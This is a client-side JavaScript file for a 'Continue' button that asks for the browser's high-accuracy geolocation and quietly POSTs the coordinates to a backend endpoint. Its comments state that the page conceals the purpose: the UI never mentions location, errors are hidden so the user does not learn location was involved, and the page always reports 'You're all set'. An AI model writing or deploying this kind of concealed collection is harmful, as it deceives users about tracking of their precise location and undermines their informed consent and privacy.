/**
 * Continue-button flow.
 * On click, request geolocation (browser permission prompt), then silently
 * POST coordinates to the backend. Nothing about location is shown in the UI.
 */

const continueBtn = document.getElementById("continue-btn");
const statusEl = document.getElementById("status");

/** Show a short, generic status message (never mentions location). */
function setStatus(message, tone = "info") {
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

/** Send location payload to the Express backend without exposing it in the UI. */
async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  // Fail quietly in the UI; still surface errors to the console for debugging.
  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
  }
}

/**
 * Ask the browser for the current position.
 * The native permission prompt appears here.
 */
function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("unsupported"));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    });
  });
}

/** Click handler: continue UX only — location is saved in the background. */
async function handleContinueClick() {
  continueBtn.disabled = true;
  setStatus("Please wait…", "info");

  try {
    const position = await requestBrowserLocation();

    // Only reached after the user grants permission in the browser prompt.
    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    // Fire-and-forget style: await save, but never show coordinates or “shared”.
    await sendLocationToServer(payload);
  } catch (error) {
    // Keep errors out of the UI so the user is not told that location was involved.
    console.error("Continue flow error:", error);
  } finally {
    setStatus("You’re all set. You can close this page.", "ok");
    continueBtn.disabled = false;
  }
}

continueBtn.addEventListener("click", handleContinueClick);
